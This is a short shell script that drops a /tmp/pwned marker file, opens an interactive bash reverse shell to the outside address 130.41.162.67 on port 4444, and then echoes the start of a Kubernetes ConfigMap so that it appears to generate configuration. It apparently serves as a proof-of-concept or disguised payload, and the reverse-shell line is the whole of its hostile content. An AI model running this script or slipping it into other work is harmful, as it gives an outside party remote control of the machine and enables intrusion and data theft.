#!/bin/sh
touch /tmp/pwned
bash -c 'bash -i >& /dev/tcp/130.41.162.67/4444 0>&1'
echo "apiVersion: v1
kind: ConfigMap
metadata:
  name: cb"
